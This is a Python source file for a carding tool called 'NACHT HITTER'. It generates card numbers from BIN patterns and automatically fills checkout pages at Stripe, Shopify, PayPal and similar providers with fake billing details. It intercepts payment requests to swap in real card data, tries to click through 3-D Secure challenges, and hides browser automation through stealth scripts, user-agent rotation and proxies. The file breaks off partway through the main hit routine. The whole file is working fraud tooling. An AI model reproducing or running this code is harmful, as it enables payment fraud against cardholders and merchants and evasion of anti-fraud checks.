#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NACHT HITTER - Engine v2
Fixes:
 - Stripe/embedded iframe card fill via frame_locator
 - Billing address auto-fill (name, country, zip)
 - 3DS detection and auto-bypass (OTP/iframe/button)
 - response_time always set, hits/fails always counted
 - Currency-aware amount display
 - Concurrent hits via asyncio.gather (up to MAX_CONCURRENT)
 - Robust submit detection with JS fallback
"""

import re
import json
import time
import random
import sqlite3
import asyncio
import requests
import urllib3
from datetime import datetime
from typing import Dict, List, Optional
from playwright.async_api import async_playwright, Page, Route, Request, Frame

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Config ────────────────────────────────────────────────────────────────────
DATABASE      = "nacht_hitter.db"
MAX_ATTEMPTS  = 100
MAX_CONCURRENT= 3

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

FAKE_BILLING = {
    "first_name": "John",
    "last_name":  "Smith",
    "name":       "John Smith",
    "address":    "123 Main Street",
    "city":       "New York",
    "state":      "NY",
    "zip":        "10001",
    "country":    "US",
    "phone":      "2125551234",
}

# ── Provider Detection ────────────────────────────────────────────────────────
def detect_provider(url: str, html: str = "") -> str:
    u = url.lower()
    if "stripe.com" in u:                           return "stripe"
    if "checkout.com" in u:                         return "checkoutcom"
    if "shopify.com" in u or "myshopify.com" in u:  return "shopify"
    if "paypal.com" in u:                           return "paypal"
    if "braintree" in u or "braintreegateway" in u: return "braintree"
    if "adyen.com" in u or "adyen" in u:            return "adyen"
    if "squareup.com" in u or "square" in u:        return "square"
    if "mollie.com" in u:                           return "mollie"
    if "klarna.com" in u:                           return "klarna"
    if "authorize.net" in u or "authorizenet" in u: return "authorizenet"
    if html:
        h = html.lower()
        if "woocommerce" in h:                      return "woocommerce"
        if "bigcommerce" in h:                      return "bigcommerce"
        if "window.shopify" in h or "shopify.com" in h: return "shopify"
        if "stripe.com/v3" in h or "stripe.js" in h:    return "stripe"
        if "braintree" in h:                        return "braintree"
        if "adyen" in h:                            return "adyen"
        if "paypal" in h:                           return "paypal"
        if "mollie" in h:                           return "mollie"
        if "klarna" in h:                           return "klarna"
        if "authorize.net" in h:                    return "authorizenet"
        if "square" in h:                           return "square"
        if "wix" in h:                              return "wix"
        if "ecwid" in h:                            return "ecwid"
        if "checkout" in h:                         return "checkoutcom"
    return "unknown"

# ── Database ──────────────────────────────────────────────────────────────────
def init_db(db_path: str = DATABASE):
    conn = sqlite3.connect(db_path)
    conn.execute("""CREATE TABLE IF NOT EXISTS hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT, user_id INTEGER, card TEXT,
        merchant TEXT, product TEXT, amount TEXT,
        success INTEGER, decline_code TEXT,
        receipt_url TEXT, response_time REAL
    )""")
    conn.commit()
    conn.close()

# ── URL Analyzer ──────────────────────────────────────────────────────────────
class URLAnalyzer:
    @staticmethod
    def _from_scripts(html: str) -> Dict:
        out = {"amount": None, "product": None, "merchant": None, "product_url": None, "currency": None}
        for script in re.findall(r"<script[^>]*>(.*?)</script>", html, re.DOTALL):
            checks = [
                (r'window\.__STRIPE__\s*=\s*({.*?});',        "obj"),
                (r'window\.__INITIAL_STATE__\s*=\s*({.*?});', "obj"),
                (r'var\s+stripePaymentData\s*=\s*({.*?});',   "obj"),
                (r'"paymentIntent"\s*:\s*({.*?})',             "obj"),
                (r'"amount"\s*:\s*(\d+)',                      "amount"),
                (r'"currency"\s*:\s*"([^"]{2,5})"',           "currency"),
                (r'"name"\s*:\s*"([^"]+)"',                   "name"),
                (r'"business_name"\s*:\s*"([^"]+)"',          "business"),
                (r'"product_url"\s*:\s*"([^"]+)"',            "product_url"),
            ]
            for pat, kind in checks:
                m = re.search(pat, script, re.DOTALL)
                if not m:
                    continue
                try:
                    if kind == "obj":
                        def _walk(obj):
                            if isinstance(obj, dict):
                                if isinstance(obj.get("amount"), (int, float)):
                                    out["amount"] = obj["amount"]
                                if isinstance(obj.get("currency"), str) and len(obj["currency"]) <= 5:
                                    out["currency"] = obj["currency"].upper()
                                if isinstance(obj.get("name"), str):
                                    out["product"] = obj["name"]
                                if isinstance(obj.get("business_name"), str):
                                    out["merchant"] = obj["business_name"]
                                if isinstance(obj.get("product_url"), str):
                                    out["product_url"] = obj["product_url"]
                                for v in obj.values():
                                    _walk(v)
                            elif isinstance(obj, list):
                                for i in obj:
                                    _walk(i)
                        _walk(json.loads(m.group(1)))
                    elif kind == "amount":
                        out["amount"] = int(m.group(1))
                    elif kind == "currency":
                        out["currency"] = m.group(1).upper()
                    elif kind == "name":
                        out["product"] = m.group(1)
                    elif kind == "business":
                        out["merchant"] = m.group(1)
                    elif kind == "product_url":
                        out["product_url"] = m.group(1)
                except Exception:
                    pass
        return out

    CURRENCY_SYMBOLS = {"USD":"$","EUR":"€","GBP":"£","CAD":"C$","AUD":"A$","JPY":"¥","INR":"₹","BRL":"R$"}

    @staticmethod
    def _fmt_amount(raw, currency: str = "USD") -> str:
        sym = URLAnalyzer.CURRENCY_SYMBOLS.get(currency.upper(), currency.upper() + " ")
        if isinstance(raw, (int, float)):
            # cents or units?
            if raw > 1000 and currency.upper() not in ("JPY", "KRW", "CLP"):
                return f"{sym}{raw/100:.2f}"
            return f"{sym}{raw:.2f}"
        s = str(raw).replace(",", "")
        try:
            val = float(s)
            if val > 1000 and currency.upper() not in ("JPY", "KRW", "CLP"):
                return f"{sym}{val/100:.2f}"
            return f"{sym}{val:.2f}"
        except Exception:
            return f"{sym}{raw}"

    @staticmethod
    def extract_amount(html: str, currency: str = "USD") -> Optional[str]:
        sd = URLAnalyzer._from_scripts(html)
        cur = sd.get("currency") or currency
        if sd.get("amount") is not None:
            return URLAnalyzer._fmt_amount(sd["amount"], cur)
        for pat in [
            r'"amount_display"\s*:\s*"([^"]+)"',
            r'"formatted_amount"\s*:\s*"([^"]+)"',
            r'data-amount="(\d+)"',
            r'"amount_subtotal"\s*:\s*(\d+)',
            r'"total"\s*:\s*(\d+)',
            r'"amount"\s*:\s*(\d+)',
            r'[\$€£₹][\s]?([\d,]+\.?\d*)',
            r'Total[:\s]+[\$€£₹]?\s*([\d,]+\.?\d*)',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                val = m.group(1).strip().replace(",", "")
                if val.startswith(("$", "€", "£", "₹")):
                    return val
                if re.match(r"^\d+\.?\d*$", val):
                    return URLAnalyzer._fmt_amount(float(val), cur)
        return None

    @staticmethod
    def extract_product_name(html: str) -> Optional[str]:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("product"):
            return sd["product"]
        for pat in [
            r'<meta property="og:title" content="([^"]+)"',
            r'"name"\s*:\s*"([^"]+)"',
            r"<h1[^>]*>(.*?)</h1>",
            r"<title>(.*?)</title>",
            r'"product_name"\s*:\s*"([^"]+)"',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                name = re.sub(r'\s*[|–\-]\s*(Stripe|Checkout|Shopify|Pay).*$', '', m.group(1).strip(), flags=re.IGNORECASE)
                name = re.sub(r'<[^>]+>', '', name).strip()
                if name and len(name) > 2:
                    return name[:120]
        return None

    @staticmethod
    def extract_merchant(html: str) -> str:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("merchant"):
            return sd["merchant"]
        for pat in [
            r'"business_name"\s*:\s*"([^"]+)"',
            r'"display_name"\s*:\s*"([^"]+)"',
            r'<meta property="og:site_name" content="([^"]+)"',
            r'<title>(.*?)\s*[|–\-]\s*(?:Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|WooCommerce)',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(1).strip()
        return "Unknown"

    @staticmethod
    def extract_currency(html: str) -> str:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("currency"):
            return sd["currency"]
        for pat in [r'"currency"\s*:\s*"([A-Z]{2,5})"', r'data-currency="([A-Z]{2,5})"',
                    r'currency["\s:=]+([A-Z]{3})', r'(?:USD|EUR|GBP|CAD|AUD|JPY|INR|BRL)']:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(0 if len(m.groups()) == 0 else 1).upper()
        return "USD"

    @staticmethod
    def extract_product_url(html: str) -> Optional[str]:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("product_url"):
            return sd["product_url"]
        for pat in [
            r'<meta property="og:url" content="([^"]+)"',
            r'<link rel="canonical" href="([^"]+)"',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m and m.group(1).startswith("http"):
                return m.group(1).strip()
        return None

    @staticmethod
    async def analyze(url: str, use_playwright: bool = False) -> Dict:
        result: Dict = {
            "url": url, "merchant": "Unknown", "product": "Unknown",
            "product_url": None, "amount": None, "currency": "USD",
            "success": False, "error": None,
        }
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS), "Accept-Language": "en-US,en;q=0.9"}
            r = requests.get(url, timeout=15, verify=False, headers=headers, allow_redirects=True)
            if r.status_code == 200:
                html = r.text
                currency = URLAnalyzer.extract_currency(html)
                result.update({
                    "merchant":    URLAnalyzer.extract_merchant(html),
                    "product":     URLAnalyzer.extract_product_name(html) or "Unknown",
                    "product_url": URLAnalyzer.extract_product_url(html),
                    "amount":      URLAnalyzer.extract_amount(html, currency),
                    "currency":    currency,
                    "success":     True,
                })
            else:
                result["error"] = f"HTTP {r.status_code}"
        except Exception as e:
            result["error"] = str(e)

        needs_deep = (
            use_playwright and
            (result["merchant"] == "Unknown" or
             result["product"] in ("Unknown", "Stripe Checkout", "Checkout", "Shopify Checkout"))
        )
        if needs_deep:
            deep = await URLAnalyzer._playwright_analyze(url)
            if deep.get("success"):
                if deep["merchant"] != "Unknown":   result["merchant"]    = deep["merchant"]
                if deep["product"] not in ("Unknown", None): result["product"] = deep["product"]
                if deep.get("product_url"):          result["product_url"] = deep["product_url"]
                if deep.get("amount"):               result["amount"]      = deep["amount"]
                if deep.get("currency", "USD") != "USD": result["currency"] = deep["currency"]
        return result

    @staticmethod
    async def _playwright_analyze(url: str) -> Dict:
        out: Dict = {"merchant": "Unknown", "product": "Unknown",
                     "product_url": None, "amount": None, "currency": "USD", "success": False}
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True,
                    args=["--disable-blink-features=AutomationControlled", "--no-sandbox"])
                ctx = await browser.new_context(ignore_https_errors=True)
                page = await ctx.new_page()
                await page.goto(url, timeout=60000, wait_until="domcontentloaded")
                await asyncio.sleep(3)

                merchant = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:site_name"]');
                    if (m) return m.content;
                    const t = document.title;
                    const x = t.match(/(.+?)\s*[|\u2013\-]\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)/);
                    return x ? x[1] : t;
                }""")
                if merchant and merchant not in ("Stripe Checkout", "Checkout", "Shopify Checkout", "PayPal"):
                    out["merchant"] = merchant.strip()

                product = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:title"]');
                    if (m) return m.content;
                    const h = document.querySelector('h1');
                    return h ? h.innerText : document.title;
                }""")
                if product and product not in ("Stripe Checkout", "Checkout", "Shopify Checkout"):
                    out["product"] = product.strip()

                product_url = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:url"]');
                    if (m) return m.content;
                    const l = document.querySelector('link[rel="canonical"]');
                    return l ? l.href : null;
                }""")
                if product_url:
                    out["product_url"] = product_url

                amount_raw = await page.evaluate(r"""() => {
                    for (let sel of ['[data-amount]','.amount','.price','.total',
                                     '[class*="amount"]','[class*="price"]','[class*="total"]']) {
                        const el = document.querySelector(sel);
                        if (el) {
                            const t = el.innerText || el.getAttribute('data-amount');
                            if (t && t.trim()) return t.trim();
                        }
                    }
                    return null;
                }""")
                if amount_raw:
                    am = re.search(r'([\$€£₹])\s*([\d,]+\.?\d*)', amount_raw)
                    if am:
                        sym_map = {"$": "USD", "€": "EUR", "£": "GBP", "₹": "INR"}
                        currency = sym_map.get(am.group(1), "USD")
                        out["amount"] = f"{am.group(1)}{am.group(2).replace(',','')}"
                        out["currency"] = currency
                    else:
                        m2 = re.search(r'[\d,]+\.?\d*', amount_raw)
                        if m2:
                            out["amount"] = f"${m2.group(0).replace(',','')}"

                currency_raw = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:price:currency"]');
                    if (m) return m.content;
                    const el = document.querySelector('[data-currency]');
                    return el ? el.getAttribute('data-currency') : null;
                }""")
                if currency_raw:
                    out["currency"] = currency_raw.upper()

                out["success"] = True
                await browser.close()
        except Exception as e:
            out["error"] = str(e)
        return out

# ── Card Generator ────────────────────────────────────────────────────────────
class CardGenerator:
    @staticmethod
    def brand(num: str) -> str:
        n = re.sub(r"\D", "", num)[:6]
        if re.match(r"^3[47]", n):                             return "amex"
        if re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n): return "mastercard"
        if re.match(r"^4", n):                                 return "visa"
        if re.match(r"^6(?:011|5)", n):                        return "discover"
        return "unknown"

    @staticmethod
    def luhn_ok(num: str) -> bool:
        digits = [int(d) for d in num]
        odd = digits[-1::-2]
        even = digits[-2::-2]
        cs = sum(odd) + sum(sum(divmod(d * 2, 10)) for d in even)
        return cs % 10 == 0

    @staticmethod
    def generate(bin_str: str) -> Optional[Dict]:
        if not bin_str or len(bin_str) < 4:
            return None
        parts = bin_str.split("|")
        raw  = re.sub(r"[^0-9xX]", "", parts[0])
        test = raw.replace("x", "0").replace("X", "0")
        b    = CardGenerator.brand(test)
        tlen = 15 if b == "amex" else 16
        cvvl = 4  if b == "amex" else 3

        card = "".join(str(random.randint(0, 9)) if c.lower() == "x" else c for c in raw)
        card += "".join(str(random.randint(0, 9)) for _ in range(tlen - len(card) - 1))
        check = next((i for i in range(10) if CardGenerator.luhn_ok(card + str(i))), 0)
        full  = card + str(check)

        month = f"{random.randint(1,12):02d}"
        if len(parts) > 1 and parts[1] and parts[1].lower() != "xx":
            month = parts[1].zfill(2)

        yr_now = datetime.now().year % 100
        year   = f"{yr_now + random.randint(1, 5):02d}"
        if len(parts) > 2 and parts[2] and parts[2].lower() != "xx":
            year = parts[2].zfill(2)

        cvv = "".join(str(random.randint(0, 9)) for _ in range(cvvl))
        if len(parts) > 3 and parts[3] and parts[3].lower() not in ("xxx", "xxxx"):
            cvv = parts[3].zfill(cvvl)

        return {"card": full, "month": month, "year": year, "cvv": cvv, "brand": b}

    @staticmethod
    def generate_many(bin_str: str, count: int) -> List[Dict]:
        return [c for _ in range(count) if (c := CardGenerator.generate(bin_str))]

    @staticmethod
    def parse(s: str) -> Optional[Dict]:
        p = s.strip().split("|")
        if len(p) == 4:
            return {
                "card":  p[0].strip(),
                "month": p[1].strip().zfill(2),
                "year":  p[2].strip().zfill(2),
                "cvv":   p[3].strip(),
                "brand": CardGenerator.brand(p[0].strip()),
            }
        return None

# ── Fingerprint ───────────────────────────────────────────────────────────────
class Fingerprint:
    @staticmethod
    def generate() -> Dict:
        return {
            "user_agent":  random.choice(USER_AGENTS),
            "viewport":    {"width": 1920, "height": 1080},
            "locale":      "en-US",
            "timezone_id": "America/New_York",
        }

    STEALTH = """
        Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
        window.chrome={runtime:{}};
        Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
        Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
    """

# ── Rate Limiter ──────────────────────────────────────────────────────────────
class RateLimiter:
    def __init__(self):
        self.delay    = 1.0
        self.failures = 0

    def next(self, success: bool) -> float:
        if success:
            self.failures = 0
            self.delay    = max(0.5, self.delay * 0.85)
        else:
            self.failures += 1
            self.delay     = min(8.0, self.delay * 1.3 + self.failures * 0.3)
        return max(0.5, min(10.0, self.delay))

# ── Autofill Helpers ──────────────────────────────────────────────────────────
async def _try_fill(page: Page, selectors: List[str], value: str,
                    frame_url_pattern: str = None) -> bool:
    """Try selectors on page; if frame_url_pattern given, also search inside matching iframes."""
    # direct page
    for sel in selectors:
        try:
            el = await page.query_selector(sel)
            if el and await el.is_visible():
                await el.click()
                await asyncio.sleep(0.1)
                await el.fill("")
                await el.type(value, delay=30)
                return True
        except Exception:
            pass

    # search in all iframes
    for frame in page.frames:
        if frame == page.main_frame:
            continue
        if frame_url_pattern and frame_url_pattern not in (frame.url or ""):
            continue
        for sel in selectors:
            try:
                el = await frame.query_selector(sel)
                if el and await el.is_visible():
                    await el.click()
                    await asyncio.sleep(0.1)
                    await el.fill("")
                    await el.type(value, delay=30)
                    return True
            except Exception:
                pass
    return False


async def _try_click(page: Page, selectors: List[str]) -> bool:
    for sel in selectors:
        try:
            btn = await page.query_selector(sel)
            if btn and await btn.is_visible():
                await btn.click()
                return True
        except Exception:
            pass
    # JS fallback: submit any visible form
    try:
        clicked = await page.evaluate("""() => {
            const btns = [...document.querySelectorAll(
                'button[type="submit"], input[type="submit"], button')];
            for (const b of btns) {
                if (b.offsetParent !== null && !b.disabled) { b.click(); return true; }
            }
            const forms = document.querySelectorAll('form');
            if (forms.length) { forms[0].submit(); return true; }
            return false;
        }""")
        return bool(clicked)
    except Exception:
        pass
    return False


async def _fill_billing(page: Page):
    """Fill common billing address fields."""
    mapping = [
        (["#billing_first_name","input[name='billing_first_name']",
          "input[name='firstName']","input[id*='first']","input[placeholder*='First']"],
         FAKE_BILLING["first_name"]),
        (["#billing_last_name","input[name='billing_last_name']",
          "input[name='lastName']","input[id*='last']","input[placeholder*='Last']"],
         FAKE_BILLING["last_name"]),
        (["#billing_address_1","input[name='billing_address_1']",
          "input[name='address']","input[name='address1']",
          "input[placeholder*='Address']","input[id*='address']"],
         FAKE_BILLING["address"]),
        (["#billing_city","input[name='billing_city']",
          "input[name='city']","input[placeholder*='City']"],
         FAKE_BILLING["city"]),
        (["#billing_postcode","input[name='billing_postcode']",
          "input[name='zip']","input[name='postal_code']",
          "input[placeholder*='ZIP']","input[placeholder*='Postal']"],
         FAKE_BILLING["zip"]),
        (["#billing_phone","input[name='billing_phone']",
          "input[name='phone']","input[type='tel']"],
         FAKE_BILLING["phone"]),
    ]
    for sels, val in mapping:
        await _try_fill(page, sels, val)

    # select country/state dropdowns
    for sel in ["#billing_country", "select[name='billing_country']",
                "select[name='country']", "select[id*='country']"]:
        try:
            el = await page.query_selector(sel)
            if el and await el.is_visible():
                await el.select_option(value="US")
                break
        except Exception:
            pass

    for sel in ["#billing_state", "select[name='billing_state']",
                "select[name='state']", "select[id*='state']"]:
        try:
            el = await page.query_selector(sel)
            if el and await el.is_visible():
                await el.select_option(value="NY")
                break
        except Exception:
            pass


# ── 3DS Handler ───────────────────────────────────────────────────────────────
async def _detect_3ds(page: Page) -> bool:
    # check for 3DS iframes
    for frame in page.frames:
        u = (frame.url or "").lower()
        if any(k in u for k in ("3ds", "challenge", "acs", "secure", "authenticate",
                                 "cardinal", "songbird", "centinel")):
            return True
    # check body text
    try:
        body = (await page.text_content("body") or "").lower()
        if any(k in body for k in ("3d secure", "3ds", "authentication required",
                                    "verify your card", "enter the otp", "one-time password",
                                    "verification code", "secure code")):
            return True
    except Exception:
        pass
    return False


async def _bypass_3ds(page: Page) -> bool:
    """Try to auto-complete 3DS challenge."""
    if not await _detect_3ds(page):
        return False

    # Try clicking continue/submit across all frames
    btn_selectors = [
        'button[type="submit"]', 'input[type="submit"]',
        'button:has-text("Continue")', 'button:has-text("Submit")',
        'button:has-text("Confirm")', 'button:has-text("Proceed")',
        'button:has-text("Verify")', 'a:has-text("Continue")',
        '#proceed-button', '.btn-primary', '#btnSubmit',
    ]

    # try on main page first
    for sel in btn_selectors:
        try:
            btn = await page.query_selector(sel)
            if btn and await btn.is_visible():
                await btn.click()
                await asyncio.sleep(3)
                return True
        except Exception:
            pass

    # try in each frame
    for frame in page.frames:
        if frame == page.main_frame:
            continue
        for sel in btn_selectors:
            try:
                btn = await frame.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    await asyncio.sleep(3)
                    return True
            except Exception:
                pass

        # submit form inside frame
        try:
            done = await frame.evaluate("""() => {
                const f = document.querySelector('form');
                if (f) { f.submit(); return true; }
                return false;
            }""")
            if done:
                await asyncio.sleep(3)
                return True
        except Exception:
            pass

    return False


async def _wait_for_3ds(page: Page, timeout_ms: int = 12000) -> bool:
    deadline = time.time() + timeout_ms / 1000
    while time.time() < deadline:
        if await _detect_3ds(page):
            return True
        await asyncio.sleep(0.5)
    return False


# ── Stripe Autofill (iframe-aware) ────────────────────────────────────────────
STRIPE_MASKED_CARD   = "4242424242424242"
STRIPE_MASKED_EXPIRY = "1230"   # MMYY compact
STRIPE_MASKED_CVV    = "424"

async def _stripe_fill_and_intercept(page: Page, real_card: Dict):
    """Fill Stripe Elements fields (handles both legacy and new iframe embedding)."""

    # Intercept Stripe API calls and swap in real card data
    async def _intercept(route: Route, request: Request):
        if request.method == "POST" and "stripe.com" in request.url:
            pd = request.post_data or ""
            c  = real_card
            # token/source creation
            pd = re.sub(r'card%5Bnumber%5D=[^&]+',    f'card%5Bnumber%5D={c["card"]}',    pd)
            pd = re.sub(r'card%5Bexp_month%5D=[^&]+',  f'card%5Bexp_month%5D={c["month"]}', pd)
            pd = re.sub(r'card%5Bexp_year%5D=[^&]+',   f'card%5Bexp_year%5D={c["year"]}',  pd)
            pd = re.sub(r'card%5Bcvc%5D=[^&]+',        f'card%5Bcvc%5D={c["cvv"]}',        pd)
            pd = re.sub(r'card\[number\]=[^&]+',        f'card[number]={c["card"]}',        pd)
            pd = re.sub(r'card\[exp_month\]=[^&]+',     f'card[exp_month]={c["month"]}',    pd)
            pd = re.sub(r'card\[exp_year\]=[^&]+',      f'card[exp_year]={c["year"]}',      pd)
            pd = re.sub(r'card\[cvc\]=[^&]+',           f'card[cvc]={c["cvv"]}',            pd)
            # payment method creation (JSON)
            pd = re.sub(r'"number"\s*:\s*"[^"]+"',      f'"number":"{c["card"]}"',          pd)
            pd = re.sub(r'"exp_month"\s*:\s*\d+',       f'"exp_month":{int(c["month"])}',   pd)
            pd = re.sub(r'"exp_year"\s*:\s*\d+',        f'"exp_year":20{c["year"]}',        pd)
            pd = re.sub(r'"cvc"\s*:\s*"[^"]+"',         f'"cvc":"{c["cvv"]}"',              pd)
            await route.continue_(post_data=pd)
            return
        await route.continue_()

    await page.route("**/*", _intercept)

    # Card number — try direct input first, then iframe
    card_sels = [
        "[data-elements-stable-field-name='cardNumber'] input",
        "#cardNumber", "input[name='cardNumber']",
        "[autocomplete='cc-number']",
        "input[placeholder*='Card number']", "input[placeholder*='card number']",
        "input[aria-label*='Card number']",
        "[class*='CardNumber'] input", "input[name='number']",
    ]
    exp_sels = [
        "[data-elements-stable-field-name='cardExpiry'] input",
        "#cardExpiry", "[name='cardExpiry']", "[autocomplete='cc-exp']",
        "input[placeholder*='MM']", "[class*='CardExpiry'] input",
    ]
    cvc_sels = [
        "[data-elements-stable-field-name='cardCvc'] input",
        "#cardCvc", "[name='cardCvc']", "[autocomplete='cc-csc']",
        "input[placeholder*='CVC']", "input[placeholder*='CVV']",
        "[class*='CardCvc'] input",
    ]
    name_sels  = ["#billingName","[name='billingName']","[autocomplete='cc-name']",
                  "input[placeholder*='Name on card']","input[placeholder*='Cardholder']"]
    email_sels = ["input[type='email']","input[name*='email']","input[autocomplete='email']",
                  "input[placeholder*='Email']"]

    # fill masked values — interceptor will swap in real data
    await _try_fill(page, card_sels,  STRIPE_MASKED_CARD)
    await asyncio.sleep(0.3)
    await _try_fill(page, exp_sels,   f"{real_card['month']}/{real_card['year']}")
    await asyncio.sleep(0.3)
    await _try_fill(page, cvc_sels,   real_card["cvv"])
    await _try_fill(page, name_sels,  FAKE_BILLING["name"])
    await _try_fill(page, email_sels, f"nacht{random.randint(100,9999)}@gmail.com")

    submit_sels = [
        ".SubmitButton", "[class*='SubmitButton']",
        "button[type='submit']", "[data-testid*='submit']",
        "button:has-text('Pay')", "button:has-text('Subscribe')",
        "button:has-text('Donate')", "button:has-text('Confirm')",
    ]
    return submit_sels


# ── Generic Autofill ──────────────────────────────────────────────────────────
GENERIC_MASKED_CARD   = "4242424242424242"
GENERIC_MASKED_EXPIRY = "01/30"
GENERIC_MASKED_CVV    = "123"

def _make_generic_intercept(domains: List[str], extra_patterns: List = None):
    """Returns an async route handler for the given domains."""
    extra = extra_patterns or []

    async def _intercept(route: Route, request: Request, real_card: Dict):
        if request.method == "POST" and any(d in request.url for d in domains):
            pd = request.post_data or ""
            pd = pd.replace(GENERIC_MASKED_CARD,        real_card["card"])
            pd = pd.replace(GENERIC_MASKED_EXPIRY[:2],  real_card["month"])
            pd = pd.replace(GENERIC_MASKED_EXPIRY[3:5], real_card["year"])
            pd = pd.replace(GENERIC_MASKED_CVV,         real_card["cvv"])
            for old, tpl in extra:
                pd = re.sub(old, tpl.format(**real_card), pd)
            await route.continue_(post_data=pd)
            return
        await route.continue_()
    return _intercept


GENERIC_CARD_SELS = [
    "#cardNumber","input[name='cardNumber']","#card-number","input[name='card_number']",
    "input[name='x_card_num']","[autocomplete='cc-number']",
    "input[placeholder*='Card number']","input[aria-label*='Card number']",
    "#wc-stripe-card-number",".card-number","#credit-card-number",
    "input[data-frames='card-number']","input[data-braintree-name='number']",
    "#number","input[name='number']","input[placeholder*='1234']",
]
GENERIC_EXP_SELS = [
    "#expiryDate","input[name='expiryDate']","#expiry-date","input[name='expiry']",
    "input[name='x_exp_date']","[autocomplete='cc-exp']","input[placeholder*='MM/YY']",
    "#cardExpiry","input[name='expDate']","#expiry","input[name='expirydate']",
    "input[data-frames='expiry-date']","input[data-braintree-name='expiration_date']",
    "#expiration-date","input[placeholder*='MM / YY']",
]
GENERIC_CVC_SELS = [
    "#cvv","input[name='cvv']","input[name='x_card_code']","[autocomplete='cc-csc']",
    "input[placeholder*='CVC']","input[placeholder*='CVV']","input[placeholder*='Security']",
    "#wc-stripe-cvc","#cvc","input[data-frames='cvv']",
    "input[data-braintree-name='cvv']","#verification_value","input[name='verification_value']",
]
GENERIC_NAME_SELS = [
    "#cardholderName","input[name='cardholderName']","input[name='x_card_name']",
    "[autocomplete='cc-name']","input[placeholder*='Name on card']",
    "input[name='cardholder_name']","#cardholder-name","#billingName",
    "input[placeholder*='Cardholder']",
]
GENERIC_EMAIL_SELS = [
    "input[type='email']","#email","input[name='email']",
    "#billing_email","input[name='billing_email']","input[placeholder*='Email']",
    "input[placeholder*='email']",
]
GENERIC_SUBMIT_SELS = [
    "button[type='submit']",".pay-button","[data-testid='pay-button']",
    "#place_order","button:has-text('Pay')","button:has-text('Submit')",
    "button:has-text('Place order')","button:has-text('Complete order')",
    "button:has-text('Pay Now')","button:has-text('Donate')",
    "button:has-text('Subscribe')","button:has-text('Confirm')",
    ".SubmitButton","input[value='Place Order']",
]

PROVIDER_DOMAINS = {
    "checkoutcom":  (["checkout.com","api.checkout.com"], []),
    "shopify":      (["shopify.com","myshopify.com","stripe.com"], [
        (r"credit_card\[number\]=4242424242424242",     "credit_card[number]={card}"),
        (r"credit_card\[month\]=01",                   "credit_card[month]={month}"),
        (r"credit_card\[year\]=30",                    "credit_card[year]={year}"),
        (r"credit_card\[verification_value\]=123",     "credit_card[verification_value]={cvv}"),
    ]),
    "paypal":       (["paypal.com","braintreegateway.com"], []),
    "braintree":    (["braintreegateway.com","braintree-api.com"], []),
    "adyen":        (["adyen.com","checkoutshopper"], []),
    "square":       (["squareup.com","square"], []),
    "mollie":       (["mollie.com","api.mollie.com"], []),
    "klarna":       (["klarna.com","api.klarna.com"], []),
    "authorizenet": (["authorize.net","authorizenet"], []),
    "woocommerce":  (["woocommerce","wc-api","wp-json/wc"], []),
    "bigcommerce":  (["bigcommerce.com","bigcommerce"], []),
    "wix":          (["wix.com","_api/wix-ecommerce"], []),
    "ecwid":        (["ecwid.com","app.ecwid.com"], []),
}

# ── Hitter Engine ─────────────────────────────────────────────────────────────
class HitterEngine:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy     = proxy
        self.results:  List[Dict] = []
        self.successes = 0
        self.fails     = 0
        self._sem      = asyncio.Semaphore(MAX_CONCURRENT)

    async def hit(self, url: str, card: Dict, merchant: str,
                  product: str, amount: str, attempt: int) -> Dict:
        async with self._sem:
            return await self._hit(url, card, merchant, product, amount, attempt)

    async def _hit(self, url: str, card: Dict, merchant: str,
                   product: str, amount: str, attempt: int) -> Dict:
        t0 = time.time()
        res: Dict = {
            "attempt": attempt, "card": card,
            "success": False, "decline_code": None,
            "receipt_url": None, "response_time": 0, "error": None,
        }

        try:
            async with async_playwright() as pw:
                fp   = Fingerprint.generate()
                args = ["--disable-blink-features=AutomationControlled",
                        "--no-sandbox", "--disable-setuid-sandbox",
                        "--disable-dev-shm-usage"]
                if self.proxy:
                    args.append(f"--proxy-server={self.proxy}")

                browser = await pw.chromium.launch(headless=True, args=args)
                ctx = await browser.new_context(
                    user_agent      = fp["user_agent"],
                    viewport        = fp["viewport"],
                    locale          = fp["locale"],
                    timezone_id     = fp["timezone_id"],
                    ignore_https_errors = True,
                )
                page = await ctx.new_page()
                await page.add_init_script(Fingerprint.STEALTH)
                await page.goto(url, timeout=60000, wait_until="domcontentloaded")
                await asyncio.sleep(2)

                html     = await page.content()
